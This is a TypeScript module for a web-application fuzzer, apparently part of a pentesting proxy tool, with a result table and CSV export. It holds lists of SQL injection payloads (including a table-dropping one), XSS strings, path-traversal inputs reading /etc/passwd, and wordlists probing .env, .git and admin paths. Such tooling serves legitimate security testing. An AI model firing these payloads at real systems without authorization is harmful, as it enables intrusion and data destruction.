export interface FuzzResult {
  method: string;
  url: string;
  parameter: string;
  payload: string;
  status: number;
  bodySize: number;
  responseTime: number;
  diff: number;
}

const SQLI_FUZZ_PAYLOADS = [
  "'", "''", "1'", "' OR '1'='1", "' OR 1=1--", '" OR "1"="1',
  "' UNION SELECT NULL--", "'; DROP TABLE users--", "1 AND 1=1", "1 AND 1=2",
  "' AND '1'='1", "' AND '1'='2", "admin'--", "admin' #",
];

const XSS_FUZZ_PAYLOADS = [
  '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
  '"><script>alert(1)</script>', '<svg onload=alert(1)>',
  'javascript:alert(1)', '<body onload=alert(1)>',
  '"><img src=x onerror=alert(1)>', "';alert(1);//",
];

const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
  '%2e%2e%2f%2e%2e%2fetc/passwd', '....//....//....//etc/passwd',
  '..%252f..%252f..%252fetc/passwd',
];

const DIRSEARCH_PAYLOADS = [
  'admin', 'login', 'signin', 'signup', 'register', 'user', 'users',
  'wp-admin', 'wp-content', 'wp-includes', 'wp-login', 'wp-json',
  'wordpress', 'joomla', 'drupal', 'magento', 'laravel', 'symfony',
  'api', 'api/v1', 'api/v2', 'v1', 'v2', 'rest', 'graphql',
  'assets', 'static', 'dist', 'build', 'public', 'uploads', 'files',
  'css', 'js', 'javascript', 'scripts', 'images', 'img', 'icons', 'fonts',
  'backup', 'backups', 'old', 'temp', 'tmp', 'test', 'tests', 'dev',
  'config', 'configuration', 'settings', 'env', '.env', 'env.php',
  '.git', '.git/config', '.gitignore', '.svn', '.htaccess', '.htpasswd',
  'sitemap.xml', 'robots.txt', 'favicon.ico', 'crossdomain.xml',
  'index.php', 'index.html', 'index', 'default', 'home', 'main',
  'about', 'contact', 'help', 'support', 'faq', 'terms', 'privacy',
  'search', 'query', 'results', 'category', 'categories', 'tag', 'tags',
  'product', 'products', 'item', 'items', 'shop', 'store', 'cart',
  'checkout', 'payment', 'orders', 'order', 'invoice', 'account',
  'profile', 'dashboard', 'panel', 'control', 'manage', 'management',
  'download', 'downloads', 'upload', 'import', 'export', 'report', 'reports',
  'ajax', 'includes', 'inc', 'lib', 'libs', 'library', 'vendor',
  'src', 'source', 'node_modules', 'bower_components', 'composer.json',
  'package.json', 'Dockerfile', 'docker-compose.yml', 'Makefile',
  'README', 'README.md', 'CHANGELOG', 'LICENSE', 'COPYING',
  'error', 'errors', 'error_log', 'debug', 'log', 'logs', 'access.log',
  'server-status', 'server-info', 'phpinfo', 'info', 'info.php',
  'ws', 'wss', 'websocket', 'socket', 'sockjs', 'sockjs-node',
  'proxy', 'proxy.pac', 'cgi-bin', 'cgi', 'cgi-bin/php',
  'pma', 'phpmyadmin', 'adminer', 'mysql', 'sql', 'phpPgAdmin',
  'swagger', 'swagger-ui', 'api-docs', 'docs', 'documentation',
  'health', 'healthz', 'readyz', 'metrics', 'status', 'ping', 'pong',
];

const SUBDOMAIN_PAYLOADS = [
  'www', 'mail', 'webmail', 'admin', 'adm', 'cpanel', 'whm', 'cpcalendars', 'cpcontacts',
  'webdisk', 'autodiscover', 'autoconfig', 'api', 'api-dev', 'api-staging', 'dev-api',
  'dev', 'development', 'staging', 'stage', 'test', 'testing', 'qa', 'uat',
  'app', 'app-dev', 'app-staging', 'app-test', 'portal', 'dashboard',
  'blog', 'wiki', 'docs', 'documentation', 'help', 'support', 'status',
  'cdn', 'static', 'assets', 'media', 'images', 'img', 'css', 'js', 'fonts',
  'upload', 'uploads', 'files', 'download', 'downloads',
  'shop', 'store', 'cart', 'checkout', 'payment', 'orders', 'order',
  'billing', 'invoice', 'account', 'accounts', 'profile', 'profiles',
  'login', 'signin', 'signup', 'register', 'auth', 'sso', 'oauth', 'oauth2',
  'idp', 'identity', 'user', 'users', 'member', 'members', 'customer', 'customers',
  'admin-console', 'console', 'manager', 'management', 'manage',
  'monitor', 'monitoring', 'metrics', 'grafana', 'prometheus', 'kibana',
  'jenkins', 'gitlab', 'git', 'github', 'bitbucket', 'jira', 'confluence',
  'sonar', 'sonarqube', 'nexus', 'artifactory', 'docker', 'registry',
  'maven', 'npm', 'pypi', 'composer', 'packagist',
  'vpn', 'vpn-admin', 'remote', 'remote-desktop', 'rdp', 'ssh',
  'proxy', 'proxy-admin', 'squid', 'nginx', 'apache', 'tomcat',
  'mysql', 'mariadb', 'postgres', 'postgresql', 'redis', 'memcached',
  'mongodb', 'couchdb', 'cassandra', 'elastic', 'elasticsearch',
  'rabbitmq', 'kafka', 'zookeeper', 'ns1', 'ns2', 'ns3', 'dns',
  'mail2', 'mail3', 'smtp', 'pop3', 'imap', 'smtp-relay',
  'web', 'web1', 'web2', 'web3', 'app1', 'app2', 'node1', 'node2',
  'server', 'server1', 'server2', 'db', 'db1', 'db2', 'database',
  'backup', 'backup1', 'backup2', 'storage', 'nas', 'san',
  'news', 'newsletter', 'forum', 'community', 'chat', 'irc',
  'calendar', 'cal', 'meet', 'meeting', 'zoom', 'teams', 'slack',
  'phone', 'voip', 'sip', 'pbx', 'asterisk', '3cx',
  'tracking', 'analytics', 'stats', 'statistics', 'piwik', 'matomo',
  'recruitment', 'jobs', 'career', 'careers', 'hr', 'employee',
  'intranet', 'internal', 'corp', 'corporate', 'office', 'office365',
  'sharepoint', 'exchange', 'lync', 'skype', 'teams',
  'lms', 'moodle', 'blackboard', 'canvas', 'sakai',
  'wordpress', 'wp', 'wp-admin', 'wp-content', 'wp-json',
  'drupal', 'joomla', 'magento', 'shopify', 'woocommerce',
  'prestashop', 'opencart', 'oscommerce', 'zencart',
  'hub', 'connect', 'partner', 'partners', 'vendor', 'vendors',
  'reseller', 'affiliate', 'affiliates', 'referral',
  'ticket', 'tickets', 'support-ticket', 'helpdesk',
  'suggest', 'feedback', 'survey', 'poll', 'vote',
  'webmail2', 'roundcube', 'squirrelmail', 'rainloop',
  'phpmyadmin', 'pma', 'adminer', 'phpPgAdmin', 'phppgadmin',
  'mailcow', 'iredmail', 'zimbra', 'zimbra-admin',
  'host', 'hosting', 'hostmaster', 'postmaster', 'abuse',
  'noc', 'network', 'syslog', 'log', 'logs', 'splunk',
  'ns1', 'ns2', 'ns3', 'ns4', 'dns1', 'dns2',
  'owa', 'ecp', 'autodiscover',
  'crm', 'erp', 'sap', 'oracle', 'peoplesoft', 'jde',
  'ldap', 'adfs', 'ad', 'dc', 'domaincontroller',
];

export function getFuzzPayloads(type: string): string[] {
  switch (type) {
    case 'sqli': return SQLI_FUZZ_PAYLOADS;
    case 'xss': return XSS_FUZZ_PAYLOADS;
    case 'path': return PATH_TRAVERSAL_PAYLOADS;
    case 'dirsearch': return DIRSEARCH_PAYLOADS;
    case 'subdomain': return SUBDOMAIN_PAYLOADS;
    default: return [];
  }
}

let _fuzzResults: FuzzResult[] = [];

export function getFuzzResults(): FuzzResult[] { return _fuzzResults; }
export function setFuzzResults(r: FuzzResult[]) { _fuzzResults = r; }
export function clearFuzzResults() { _fuzzResults = []; }

export function replaceJsonKey(body: string, key: string, newValue: string, append?: boolean): string {
  try {
    const obj = JSON.parse(body);
    const keys = key.split('.');
    let current: any = obj;
    for (let i = 0; i < keys.length - 1; i++) {
      if (current[keys[i]] === undefined) return body;
      current = current[keys[i]];
    }
    const lastKey = keys[keys.length - 1];
    if (current[lastKey] === undefined) return body;
    current[lastKey] = append ? String(current[lastKey]) + newValue : newValue;
    return JSON.stringify(obj, null, 2);
  } catch {
    return body;
  }
}

export function renderFuzzerDialog(): string {
  return `
<div id="fuzzer-dialog" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:550px;max-height:85vh;background:#1e1e1e;border:1px solid #444;border-radius:6px;z-index:9999;padding:12px;overflow-y:auto;box-shadow:0 4px 20px rgba(0,0,0,0.5)">
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
    <span style="font-weight:bold;color:#ffd700">\uD83D\uDD0D Fuzzer</span>
    <button id="fuzzer-close" class="btn btn-xs btn-default" style="padding:0 6px">&times;</button>
  </div>
  <div style="display:flex;gap:8px;margin-bottom:6px">
    <div style="flex:1">
      <label style="color:#aaa;font-size:11px">Position:</label>
      <select id="fuzzer-position" class="form-control" style="font-size:12px;padding:2px 6px">
        <option value="url-param">URL Parameter</option>
        <option value="json-body-key">JSON Body Key</option>
        <option value="url-path">URL Path (Directory)</option>
      </select>
    </div>
    <div style="flex:1">
      <label style="color:#aaa;font-size:11px">Target field:</label>
      <input id="fuzzer-param" class="form-control" placeholder="parameter_name" style="font-size:12px;padding:2px 6px">
    </div>
  </div>
  <div style="display:flex;gap:8px;margin-bottom:6px">
    <div style="flex:1">
      <label style="color:#aaa;font-size:11px">Payload type:</label>
      <select id="fuzzer-type" class="form-control" style="font-size:12px;padding:2px 6px">
        <option value="sqli">SQL Injection</option>
        <option value="xss">Cross-Site Scripting (XSS)</option>
        <option value="path">Path Traversal</option>
        <option value="dirsearch">Directory Search</option>
        <option value="subdomain">Subdomain Discovery</option>
      </select>
    </div>
    <div style="flex:1;align-self:flex-end">
      <label style="display:block;font-size:11px;color:#aaa"><input type="checkbox" id="fuzzer-append" style="margin-right:4px"> Same value</label>
    </div>
  </div>
  <div style="margin-bottom:8px;display:flex;gap:4px">
    <button id="fuzzer-start" class="btn btn-sm btn-danger" style="flex:1">⚡ Start Fuzzing</button>
    <button id="fuzzer-stop" class="btn btn-sm btn-default" style="display:none;flex:0.4">⏹ Stop</button>
  </div>
  <div id="fuzzer-progress" style="display:none;margin-bottom:6px">
    <div style="display:flex;justify-content:space-between;font-size:11px;color:#888">
      <span id="fuzzer-progress-text">0 / 0</span>
      <span id="fuzzer-progress-pct">0%</span>
    </div>
    <div style="height:4px;background:#333;border-radius:2px;margin-top:2px">
      <div id="fuzzer-progress-bar" style="height:100%;width:0%;background:#ffd700;border-radius:2px;transition:width 0.3s"></div>
    </div>
  </div>
  <div id="fuzzer-results" style="max-height:300px;overflow-y:auto;font-size:11px"></div>
  <div style="margin-top:4px;display:flex;gap:4px;justify-content:flex-end;align-items:center">
    <label style="color:#888;font-size:10px;margin-right:auto"><input type="checkbox" id="fuzzer-hide-noise" style="margin-right:3px">Hide 0/404</label>
    <button id="fuzzer-export-csv" class="btn btn-xs btn-default">Export CSV</button>
    <button id="fuzzer-clear" class="btn btn-xs btn-default">Clear</button>
  </div>
</div>`;
}

export function fuzzResultsToCsv(results: FuzzResult[]): string {
  let csv = 'Index,Method,URL,Parameter,Payload,Status,Size,Time,Diff\n';
  for (let i = 0; i < results.length; i++) {
    const r = results[i];
    csv += (i + 1) + ',' + r.method + ',"' + r.url + '",' + r.parameter + ',"' + r.payload.replace(/"/g, '""') + '",' + r.status + ',' + r.bodySize + ',' + r.responseTime + ',' + r.diff + '\n';
  }
  return csv;
}

function escapeHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

export function fuzzResultsToHtml(results: FuzzResult[]): string {
  if (!results.length) return '<div style="color:#888;padding:8px;text-align:center">No results yet</div>';

  const hasNon404 = results.some(r => r.status !== 404 && r.status !== 0);

  let html = '<table style="width:100%;border-collapse:collapse;font-size:10px">';
  html += '<tr style="background:#2a2a2a"><th style="padding:4px;text-align:left">#</th><th style="padding:4px;text-align:left">Payload</th><th style="padding:4px;text-align:right">Status</th><th style="padding:4px;text-align:right">Size</th><th style="padding:4px;text-align:right">Time</th>' + (hasNon404 ? '<th style="padding:4px;text-align:right">URL</th>' : '') + '</tr>';

  for (let i = 0; i < results.length; i++) {
    const r = results[i];
    const isInteresting = r.status > 0 && r.status !== 404 && r.status !== 410;
    const bg = isInteresting ? '#1a2a1a' : (r.status === 0 ? '#1a1a1a' : '#1a1a1a');
    html += '<tr class="fuzz-result-row" data-url="' + escapeHtml(r.url) + '" data-method="' + escapeHtml(r.method) + '" data-payload="' + escapeHtml(r.payload) + '" style="background:' + bg + ';cursor:pointer">';
    html += '<td style="padding:2px 4px;color:#888">' + (i + 1) + '</td>';
    html += '<td style="padding:2px 4px;color:#eee;font-family:monospace;word-break:break-all;max-width:200px">' + escapeHtml(r.payload.substring(0, 50)) + '</td>';
    let statusText: string;
    let statusColor: string;
    if (r.status === 0) {
      statusText = 'ERR';
      statusColor = '#666';
    } else if (r.status >= 400) {
      statusText = String(r.status);
      statusColor = '#ff4444';
    } else if (r.status >= 300) {
      statusText = String(r.status);
      statusColor = '#ffaa00';
    } else {
      statusText = String(r.status);
      statusColor = '#44cc44';
    }
    html += '<td style="padding:2px 4px;text-align:right;font-weight:' + (isInteresting ? 'bold' : 'normal') + ';color:' + statusColor + '">' + statusText + '</td>';
    html += '<td style="padding:2px 4px;text-align:right;color:#888">' + r.bodySize + '</td>';
    html += '<td style="padding:2px 4px;text-align:right;color:#888">' + r.responseTime + 'ms</td>';
    if (hasNon404) {
      const displayUrl = r.url.length > 60 ? r.url.substring(0, 57) + '...' : r.url;
      html += '<td style="padding:2px 4px;text-align:right;color:#888;font-size:9px;max-width:180px;overflow:hidden">' + escapeHtml(displayUrl) + '</td>';
    }
    html += '</tr>';
  }

  html += '</table>';
  return html;
}
